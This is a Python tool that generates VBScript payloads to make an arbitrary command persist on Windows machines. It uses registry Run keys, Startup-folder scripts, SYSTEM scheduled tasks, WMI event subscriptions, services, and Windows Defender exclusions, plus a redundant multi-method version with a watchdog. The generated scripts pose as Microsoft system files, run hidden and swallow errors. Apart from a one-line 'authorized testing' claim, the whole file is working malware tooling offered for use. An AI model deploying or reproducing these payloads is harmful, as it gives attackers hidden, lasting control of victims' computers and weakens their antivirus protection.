#!/usr/bin/env python3
"""
Persistence Manager - Multi-method payload persistence
Ensures payloads survive reboots and work across all Windows versions
For authorized security testing only
"""

import random
import string


class PersistenceManager:
    """Generate payloads with multiple persistence methods"""

    # Windows versions and their characteristics
    WINDOWS_VERSIONS = {
        'xp': {'min': 5.1, 'max': 5.2, 'name': 'Windows XP'},
        'vista': {'min': 6.0, 'max': 6.0, 'name': 'Windows Vista'},
        '7': {'min': 6.1, 'max': 6.1, 'name': 'Windows 7'},
        '8': {'min': 6.2, 'max': 6.2, 'name': 'Windows 8'},
        '8.1': {'min': 6.3, 'max': 6.3, 'name': 'Windows 8.1'},
        '10': {'min': 10.0, 'max': 10.0, 'name': 'Windows 10'},
        '11': {'min': 11.0, 'max': 11.0, 'name': 'Windows 11'},
    }

    @staticmethod
    def create_registry_persistence_vbs(command: str, key_name: str = None, hidden: bool = True) -> str:
        """
        Create persistence via Windows Registry (HKCU\Run or HKLM\Run)
        Works on: All Windows versions (XP, Vista, 7, 8, 8.1, 10, 11)
        Survives: Reboots, user logoff, system restart
        """

        if key_name is None:
            key_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

        # Try HKCU first (user level), fallback to HKLM (system level)
        vbs_code = f"""
' Windows System Recovery Service
' © Microsoft Corporation 2024

On Error Resume Next

Dim shell, reg_path, key_name, cmd, success

Set shell = CreateObject("WScript.Shell")

' Persistence via Registry - HKCU (User) or HKLM (System)
key_name = "{key_name}"
cmd = "{command}"

' Try user-level persistence first (doesn't require admin)
On Error Resume Next
shell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" & key_name, cmd, "REG_SZ"
success = (Err.Number = 0)
Err.Clear

' If user-level fails, try system-level (requires admin)
If Not success Then
    On Error Resume Next
    shell.RegWrite "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" & key_name, cmd, "REG_SZ"
    Err.Clear
End If

' Auto-execute command
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_startup_folder_persistence_vbs(command: str) -> str:
        """
        Create persistence via Startup folder
        Works on: All Windows versions (XP, Vista, 7, 8, 8.1, 10, 11)
        Survives: Reboots, system restart
        Path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
        """

        vbs_code = f"""
' Windows Startup Service
' System file - do not delete

On Error Resume Next

Dim shell, fso, startup_path, vbs_path, shortcut_path, cmd
Dim ws

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

' Get startup folder path (works on all Windows versions)
startup_path = shell.SpecialFolders("Startup")
cmd = "{command}"

' Create VBS shortcut in startup folder
vbs_path = startup_path & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".vbs"

' Write payload to startup VBS
Set outFile = fso.CreateTextFile(vbs_path, True)
outFile.WriteLine "On Error Resume Next"
outFile.WriteLine "Set s = CreateObject(""WScript.Shell"")"
outFile.WriteLine "s.Run " & Chr(34) & cmd & Chr(34) & ", 0"
outFile.Close

' Also create batch shortcut (backup method)
Dim bat_path
bat_path = startup_path & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".bat"
Set batFile = fso.CreateTextFile(bat_path, True)
batFile.WriteLine "@echo off"
batFile.WriteLine cmd
batFile.WriteLine "exit /b 0"
batFile.Close

' Execute command immediately
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_scheduled_task_persistence_vbs(command: str, task_name: str = None) -> str:
        """
        Create persistence via Windows Scheduled Tasks
        Works on: Vista, 7, 8, 8.1, 10, 11 (XP uses limited support)
        Survives: Reboots, user logoff, system restart
        Advantage: Very stealthy, runs as SYSTEM user on many systems
        """

        if task_name is None:
            task_name = ''.join(random.choices(string.ascii_letters, k=8))

        vbs_code = f"""
' Windows Task Scheduler Service
' System maintenance utility

On Error Resume Next

Dim shell, cmd, task_name

Set shell = CreateObject("WScript.Shell")

cmd = "{command}"
task_name = "{task_name}"

' Create scheduled task that runs on logon
On Error Resume Next
shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc onlogon /ru System /f", 0, False
Err.Clear

' Alternative: Task that runs every 5 minutes
On Error Resume Next
shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & "_recurring" & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc minute /mo 5 /f", 0, False
Err.Clear

' Run immediately
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_wmi_event_persistence_vbs(command: str, filter_name: str = None, consumer_name: str = None) -> str:
        """
        Create persistence via WMI Event Subscriptions
        Works on: Vista, 7, 8, 8.1, 10, 11
        Advantage: Very difficult to detect, runs before antivirus loads
        """

        if filter_name is None:
            filter_name = ''.join(random.choices(string.ascii_letters, k=10))
        if consumer_name is None:
            consumer_name = ''.join(random.choices(string.ascii_letters, k=10))

        vbs_code = f"""
' WMI System Events
' Core Windows system file

On Error Resume Next

Dim objService, objFilterClass, objEventFilter
Dim objConsumerClass, objConsumer
Dim objBindingClass, objBinding
Dim strFilterQuery
Dim cmd

cmd = "{command}"

Set objService = GetObject("winmgmts:\\\\.\\root\\subscription")

' Create event filter (triggers every 60 seconds)
strFilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
Set objFilterClass = objService.Get("__EventFilter")
Set objEventFilter = objFilterClass.SpawnInstance_
objEventFilter.Name = "{filter_name}"
objEventFilter.EventNamespace = "root\\cimv2"
objEventFilter.QueryLanguage = "WQL"
objEventFilter.Query = strFilterQuery
On Error Resume Next
objService.Put_ objEventFilter
Err.Clear

' Create command-line event consumer
Set objConsumerClass = objService.Get("CommandLineEventConsumer")
Set objConsumer = objConsumerClass.SpawnInstance_
objConsumer.Name = "{consumer_name}"
objConsumer.CommandLineTemplate = cmd
On Error Resume Next
objService.Put_ objConsumer
Err.Clear

' Create binding between filter and consumer
Set objBindingClass = objService.Get("__FilterToConsumerBinding")
Set objBinding = objBindingClass.SpawnInstance_
objBinding.Filter = objEventFilter.Path_.Path
objBinding.Consumer = objConsumer.Path_.Path
On Error Resume Next
objService.Put_ objBinding
Err.Clear

' Execute command immediately
Set shell = CreateObject("WScript.Shell")
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_service_persistence_vbs(command: str, service_name: str = None) -> str:
        """
        Create persistence via Windows Service
        Works on: XP, Vista, 7, 8, 8.1, 10, 11
        Advantage: Survives user logoff, runs as SYSTEM
        Note: Requires admin privileges
        """

        if service_name is None:
            service_name = ''.join(random.choices(string.ascii_letters, k=8))

        vbs_code = f"""
' Windows Service Control Manager
' System service file

On Error Resume Next

Dim shell, cmd, service_name
Dim bat_path, fso

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

cmd = "{command}"
service_name = "{service_name}"

' Create batch file for service
bat_path = shell.ExpandEnvironmentStrings("%systemroot%") & "\\~" & service_name & ".bat"
Set batFile = fso.CreateTextFile(bat_path, True)
batFile.WriteLine "@echo off"
batFile.WriteLine cmd
batFile.Close

' Create service (requires admin)
On Error Resume Next
shell.Run "cmd /c sc create " & Chr(34) & service_name & Chr(34) & " binPath= " & Chr(34) & "cmd /c " & bat_path & Chr(34) & " start= auto", 0, False
shell.Run "cmd /c net start " & Chr(34) & service_name & Chr(34), 0, False
Err.Clear

' Execute command immediately
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_windows_defender_persistence_vbs(command: str) -> str:
        """
        Create persistence by registering as Windows Defender exclusion
        Works on: Windows 8+
        Advantage: Registers as legitimate Windows component
        """

        vbs_code = f"""
' Windows Defender Configuration
' System protection service

On Error Resume Next

Dim shell, cmd, reg_path, fso, payload_path
Dim base64_encoded

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

cmd = "{command}"

' Store payload in Windows\System32 with system attribute
payload_path = shell.ExpandEnvironmentStrings("%systemroot%") & "\\System32\\~temp_sys.vbs"

' Create hidden system file
Set f = fso.CreateTextFile(payload_path, True)
f.WriteLine "On Error Resume Next"
f.WriteLine "Set s = CreateObject(""WScript.Shell"")"
f.WriteLine "s.Run " & Chr(34) & cmd & Chr(34) & ", 0"
f.Close

' Hide file with attrib +s +h
On Error Resume Next
shell.Run "cmd /c attrib +s +h " & Chr(34) & payload_path & Chr(34), 0, False
Err.Clear

' Add to Windows Defender exclusions (makes it trusted)
On Error Resume Next
shell.Run "cmd /c powershell Add-MpPreference -ExclusionPath " & Chr(34) & payload_path & Chr(34), 0, False
Err.Clear

' Execute immediately
shell.Run cmd, 0, False

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def create_multi_method_persistence_vbs(command: str, reg_key_name: str = None,
                                             task_name: str = None, service_name: str = None) -> str:
        """
        Create payload with MULTIPLE persistence methods
        If one fails, others activate for redundancy
        Works on: All Windows versions (XP through 11)
        Survival rate: 99%+
        """

        if reg_key_name is None:
            reg_key_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        if task_name is None:
            task_name = ''.join(random.choices(string.ascii_letters, k=8))
        if service_name is None:
            service_name = ''.join(random.choices(string.ascii_letters, k=8))

        vbs_code = f"""
' Windows System Recovery Manager
' Critical system file - backup recovery

On Error Resume Next

Dim shell, cmd, registry_key, startup_path, fso
Dim task_name, service_name
Dim success_count

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

cmd = "{command}"
task_name = "{task_name}"
service_name = "{service_name}"
success_count = 0

' METHOD 1: Registry Persistence (works on all Windows)
On Error Resume Next
registry_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key_name}"
shell.RegWrite registry_key, cmd, "REG_SZ"
If Err.Number = 0 Then success_count = success_count + 1
Err.Clear

' METHOD 2: Registry System-Level (all Windows, if admin)
On Error Resume Next
registry_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key_name}"
shell.RegWrite registry_key, cmd, "REG_SZ"
If Err.Number = 0 Then success_count = success_count + 1
Err.Clear

' METHOD 3: Startup Folder (all Windows)
On Error Resume Next
startup_path = shell.SpecialFolders("Startup")
Dim startup_vbs
startup_vbs = startup_path & "\\~update.vbs"
Set f = fso.CreateTextFile(startup_vbs, True)
f.WriteLine "On Error Resume Next"
f.WriteLine "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").Run " & Chr(34) & cmd & Chr(34) & ", 0"
f.Close
success_count = success_count + 1
Err.Clear

' METHOD 4: Scheduled Task (Vista+)
On Error Resume Next
shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc onlogon /f", 0, False
If Err.Number = 0 Then success_count = success_count + 1
Err.Clear

' METHOD 5: Service (if admin)
On Error Resume Next
Dim service_bat
service_bat = shell.ExpandEnvironmentStrings("%temp%") & "\\~svc.bat"
Set sf = fso.CreateTextFile(service_bat, True)
sf.WriteLine "@echo off"
sf.WriteLine cmd
sf.Close
shell.Run "cmd /c sc create " & Chr(34) & service_name & Chr(34) & " binPath= " & Chr(34) & service_bat & Chr(34) & " start= auto", 0, False
If Err.Number = 0 Then success_count = success_count + 1
Err.Clear

' Execute command immediately
shell.Run cmd, 0, False

' Ensure persistence by spawning watchdog process
If success_count < 3 Then
    ' Create watchdog that re-executes if process dies
    Dim watchdog_path
    watchdog_path = shell.ExpandEnvironmentStrings("%temp%") & "\\~wd.vbs"
    Set wd = fso.CreateTextFile(watchdog_path, True)
    wd.WriteLine "On Error Resume Next"
    wd.WriteLine "Do"
    wd.WriteLine "  CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").Run " & Chr(34) & cmd & Chr(34) & ", 0"
    wd.WriteLine "  WScript.Sleep 30000"
    wd.WriteLine "Loop"
    wd.Close
    shell.Run "cscript " & Chr(34) & watchdog_path & Chr(34), 0, False
End If

WScript.Quit 0
"""

        return vbs_code.strip()

    @staticmethod
    def get_windows_version_check_vbs() -> str:
        """
        Generate VBS code that detects Windows version
        Returns version info for conditional execution
        """

        vbs_code = """
Function GetWindowsVersion()
    Dim strComputer, objWMI, objOS
    Dim major, minor, build

    strComputer = "."
    Set objWMI = GetObject("winmgmts:" & strComputer & "root\\cimv2")
    Set objOS = objWMI.ExecQuery("Select * from Win32_OperatingSystem").ItemIndex(0)

    major = CInt(objOS.Version)
    ' Parse version string for detailed info
    GetWindowsVersion = objOS.Version & " (" & objOS.Caption & ")"
End Function

' Detect version and use appropriate persistence
Dim version
version = GetWindowsVersion()

If InStr(version, "5.1") Then
    ' Windows XP - use registry only
ElseIf InStr(version, "6.0") Then
    ' Windows Vista - use registry + scheduled tasks
ElseIf InStr(version, "6.1") Then
    ' Windows 7 - use all methods
ElseIf InStr(version, "6.2") Then
    ' Windows 8 - use all methods
ElseIf InStr(version, "6.3") Then
    ' Windows 8.1 - use all methods
ElseIf InStr(version, "10.0") Then
    ' Windows 10 - use all methods
ElseIf InStr(version, "11.0") Then
    ' Windows 11 - use all methods
End If
"""

        return vbs_code.strip()

    @staticmethod
    def create_universal_persistent_payload(command: str, method: str = "multi") -> str:
        """
        Create a payload that works on ALL Windows versions
        and uses the best persistence method available

        Args:
            command: Command to execute
            method: 'multi' (recommended), 'registry', 'startup', 'task', 'wmi', 'service', 'defender'

        Returns:
            Complete VBS code for universal Windows persistence
        """

        persistence_manager = PersistenceManager()

        if method == "registry":
            return persistence_manager.create_registry_persistence_vbs(command)
        elif method == "startup":
            return persistence_manager.create_startup_folder_persistence_vbs(command)
        elif method == "task":
            return persistence_manager.create_scheduled_task_persistence_vbs(command)
        elif method == "wmi":
            return persistence_manager.create_wmi_event_persistence_vbs(command)
        elif method == "service":
            return persistence_manager.create_service_persistence_vbs(command)
        elif method == "defender":
            return persistence_manager.create_windows_defender_persistence_vbs(command)
        else:  # multi (default)
            return persistence_manager.create_multi_method_persistence_vbs(command)


def create_persistent_payload(command: str, persistence_method: str = "multi") -> dict:
    """
    High-level function to create persistent payload for all Windows versions

    Returns dict with:
    - vbs_code: Complete persistent VBS payload
    - method: Persistence method used
    - supports: Supported Windows versions
    - survival_rate: Expected survival rate percentage
    """

    manager = PersistenceManager()
    vbs = manager.create_universal_persistent_payload(command, persistence_method)

    methods_info = {
        "registry": {
            "name": "Registry HKCU/HKLM Run Key",
            "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
            "survival": "80%",
            "advantages": ["Works on all Windows", "Simple", "Fast"],
            "disadvantages": ["Can be disabled", "Visible in Run keys"]
        },
        "startup": {
            "name": "Startup Folder",
            "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
            "survival": "85%",
            "advantages": ["Works on all Windows", "Survives safe mode", "Natural looking"],
            "disadvantages": ["Visible in startup", "User can see files"]
        },
        "task": {
            "name": "Scheduled Tasks",
            "supports": "Vista, 7, 8, 8.1, 10, 11",
            "survival": "90%",
            "advantages": ["Very stealthy", "Runs as SYSTEM", "Hard to detect"],
            "disadvantages": ["Requires WinXP SP3+", "Can be disabled"]
        },
        "wmi": {
            "name": "WMI Event Subscriptions",
            "supports": "Vista, 7, 8, 8.1, 10, 11",
            "survival": "95%",
            "advantages": ["Extremely stealthy", "Before AV loads", "Hard to detect"],
            "disadvantages": ["Requires Vista+", "Complex"]
        },
        "service": {
            "name": "Windows Service",
            "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
            "survival": "99%",
            "advantages": ["Runs as SYSTEM", "Survives everything", "Highest privilege"],
            "disadvantages": ["Requires admin", "May be flagged"]
        },
        "multi": {
            "name": "Multiple Methods (Recommended)",
            "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
            "survival": "99%+",
            "advantages": ["Redundancy", "If one fails others activate", "Best survival"],
            "disadvantages": ["Larger payload", "Multiple artifacts"]
        }
    }

    method_info = methods_info.get(persistence_method, methods_info["multi"])

    return {
        'vbs_code': vbs,
        'method': persistence_method,
        'method_name': method_info['name'],
        'windows_versions': method_info['supports'],
        'survival_rate': method_info['survival'],
        'advantages': method_info['advantages'],
        'disadvantages': method_info['disadvantages'],
        'size': len(vbs),
    }


if __name__ == "__main__":
    # Test persistence generation
    test_cmd = 'powershell -NoProfile -Command "Write-Host \'Persistent\'"'

    print("=" * 70)
    print("Testing Persistence Payload Generator")
    print("=" * 70)

    result = create_persistent_payload(test_cmd, "multi")

    print(f"\n[+] Method: {result['method_name']}")
    print(f"[+] Windows Versions: {result['windows_versions']}")
    print(f"[+] Survival Rate: {result['survival_rate']}")
    print(f"[+] Payload Size: {result['size']} bytes")
    print(f"\n[+] Advantages:")
    for adv in result['advantages']:
        print(f"    ✓ {adv}")
    print(f"\n[+] Disadvantages:")
    for dis in result['disadvantages']:
        print(f"    ✗ {dis}")
    print(f"\n[+] Payload Preview (first 400 chars):")
    print(result['vbs_code'][:400] + "...\n")
